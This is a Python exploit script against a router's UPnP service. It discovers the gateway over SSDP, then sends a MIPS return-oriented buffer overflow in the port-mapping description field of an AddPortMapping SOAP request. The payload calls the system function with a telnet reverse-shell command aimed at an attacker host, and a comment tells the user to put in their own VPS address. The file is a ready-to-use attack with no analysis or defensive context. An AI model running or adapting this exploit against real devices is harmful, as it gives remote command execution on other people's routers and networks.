import socket

import requests
from upnpy.ssdp.SSDPDevice import SSDPDevice
msg = \
    b'M-SEARCH * HTTP/1.1\r\n' \
    b'HOST:239.255.255.250:1900\r\n' \
    b'ST:upnp:rootdevice\r\n' \
    b'MX:2\r\n' \
    b'MAN:"ssdp:discover"\r\n' \
    b'\r\n'

# Set up UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.bind((b"192.168.2.100",23333)) # client ip address
s.settimeout(2)
s.sendto(msg, (b'239.255.255.250', 1900))
addr = ('192.168.2.1', 1900) # gateway ip address
data = b""
try:
    while True:
        data, addr = s.recvfrom(65507)
        # print(addr,data)
        # device = SSDPDevice(addr,data.decode())
except socket.timeout:
    pass


addr = ('192.168.3.1', 1900)
# data = b'HTTP/1.1 200 OK\r\nCache-Control: max-age=120\r\nDate: Fri, 01 Jan 2010 00:44:16 GMT\r\nExt: \r\nLocation: http://192.168.2.1:1780/InternetGatewayDevice.xml\r\nServer: POSIX UPnP/1.0 linux/5.70.48.16\r\nST: upnp:rootdevice\r\nUSN: uuid:31474a87-67ea-dae4-2f73-f157fb06d22b::upnp:rootdevice\r\n\r\n'

device = SSDPDevice(addr, data.decode())
services = device.get_services()

services_id = [services[i].id.split(":")[-1] for i in range(len(services))]

service = device["WANIPConn1"]

lic_base = 0x2ad01000
system_addr = lic_base+0x4C7E0
sys_encode = bytes.fromhex(hex(system_addr)[2:])[::-1]
gadget = lic_base+0x257A0 #  addiu $a0,$sp,0x38+var_20  |  jalr  $s0
gadget_encode = bytes.fromhex(hex(gadget)[2:])[::-1]
cmd = b"telnet 192.168.2.100 4444 | sh | telnet 192.168.2.100 5555" # your vps_ip and port
payload = b"a"*224+sys_encode+b"aaaa"*8+gadget_encode+b"a"*0x18+cmd

import urllib.parse
import urllib.error


def AddPortMapping(service,NewRemoteHost,NewExternalPort,NewProtocol,NewInternalPort,NewInternalClient,NewEnabled,NewPortMappingDescription,NewLeaseDuration):
    body = b'<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost>'\
    +NewRemoteHost+b'</NewRemoteHost><NewExternalPort>'\
    +NewExternalPort+b'</NewExternalPort><NewProtocol>'\
    +NewProtocol+b'</NewProtocol><NewInternalPort>'\
    +NewInternalPort+b'</NewInternalPort><NewInternalClient>'\
    +NewInternalClient+b'</NewInternalClient><NewEnabled>' \
    +NewEnabled+b'</NewEnabled><NewPortMappingDescription>' \
    +NewPortMappingDescription+b'</NewPortMappingDescription><NewLeaseDuration>'\
    +NewLeaseDuration+b'</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>'

    headers = {
        'Host': f'{urllib.parse.urlparse(service.base_url).netloc}',
        'Content-Length': str(len(body)),
        'Content-Type': 'text/xml; charset="utf-8"',
        'SOAPAction': f'"{service.service}#AddPortMapping"'
    }
    target = "http://"+urllib.parse.urlparse(service.base_url).netloc+"/control?WANIPConnection"
    try:
        requests.post(url=target,data=body,headers=headers,timeout=5)
    except:
        pass
    print("done!")

NewRemoteHost=b''
NewExternalPort=b'5008'
NewProtocol=b'TCP'
NewInternalPort=b"6008"
NewInternalClient=b'192.168.2.100'
NewEnabled=b'0'
NewPortMappingDescription=payload
NewLeaseDuration=b'0'

AddPortMapping(service,NewRemoteHost,NewExternalPort,NewProtocol,NewInternalPort,NewInternalClient,NewEnabled,NewPortMappingDescription,NewLeaseDuration)


